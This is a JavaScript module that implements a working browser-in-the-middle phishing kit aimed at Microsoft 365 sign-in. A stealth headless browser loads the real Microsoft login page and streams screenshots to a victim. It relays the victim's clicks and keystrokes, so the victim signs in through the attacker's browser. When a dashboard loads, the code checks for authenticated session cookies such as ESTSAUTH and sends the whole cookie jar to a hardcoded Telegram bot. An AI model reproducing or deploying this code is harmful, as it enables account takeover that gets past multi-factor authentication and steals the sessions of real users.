const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

// Shared Viewport Config
const VIEWPORT_WIDTH = 1280;
const VIEWPORT_HEIGHT = 720;

async function sendExfiltrationAlert(cookies, finalUrl) {
    const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
    const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        const host = new URL(finalUrl).hostname;
        const textAlert = `<b>✅ FULL AUTHENTICATION CAPTURED</b>\n\n<b>Domain:</b> <code>${host}</code>\n<b>Tokens:</b> ${cookies.length}\n\n<i>Status: Validated session tokens found.</i>`;
        
        await axios.post(msgUrl, {
            chat_id: CHAT_ID,
            text: textAlert,
            parse_mode: 'HTML'
        });

        const cookieData = JSON.stringify(cookies, null, 2);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption', `Authenticated Jar: ${host}`);
        form.append('document', Buffer.from(cookieData, 'utf-8'), {
            filename: `FINAL_SESSION_${Date.now()}.json`,
            contentType: 'application/json'
        });

        await axios.post(docUrl, form, { headers: form.getHeaders() });
        console.log("[TELEGRAM] Sent validated session file.");

    } catch (e) {
        console.error('[TELEGRAM-ERR]', e.message);
    }
}

async function startSession(io, socket) {
    let browser;
    let hasExfiltrated = false;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', `--window-size=${VIEWPORT_WIDTH},${VIEWPORT_HEIGHT}`]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: VIEWPORT_WIDTH, height: VIEWPORT_HEIGHT });
        
        // Anti-Detection Profile
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
        const heartbeat = setInterval(emitFrame, 1200);

        page.on('framenavigated', async (frame) => {
            const url = frame.url().toLowerCase();
            
            if (!hasExfiltrated) {
                // Check if we are on a known productivity dashboard
                const isDashboard = url.includes('office.com') || 
                                    url.includes('outlook.live.com') || 
                                    url.includes('microsoft365.com') ||
                                    url.includes('sharepoint.com');

                // Explicitly ignore the initial redirect/authorize steps
                const isAuthProcess = url.includes('/oauth20_authorize.srf') || url.includes('/openid/authorize');

                if (isDashboard && !isAuthProcess) {
                    // Temporarily block more triggers while we check cookies
                    hasExfiltrated = true; 
                    
                    console.log(`[CHECK] Potential success: ${url}. Waiting for tokens...`);
                    await new Promise(r => setTimeout(r, 5000)); // Wait for cookies to settle
                    
                    const cookies = await page.cookies();
                    
                    // VALIDATION: Does the jar contain actual auth tokens?
                    const hasAuthTokens = cookies.some(c => 
                        c.name.includes('ESTSAUTH') || 
                        c.name.includes('RPSSecAuth') || 
                        c.name.includes('__Host-MSAAUTH') ||
                        c.name.includes('NAP')
                    );

                    if (hasAuthTokens) {
                        console.log("[SUCCESS] Valid auth tokens found. Sending...");
                        await sendExfiltrationAlert(cookies, url);
                    } else {
                        // Not authenticated yet (likely still on a "Stay Signed In" prompt)
                        console.log("[RETRY] Dashboard reached but high-value tokens missing. Resetting lock.");
                        hasExfiltrated = false; 
                    }
                }
            }
        });

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    // Added small delay to click for human-like interaction
                    await page.mouse.click(data.x, data.y, { delay: 50 });
                } 
                else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
                await emitFrame();
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            if (browser) await browser.close();
        });

    } catch (error) {
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
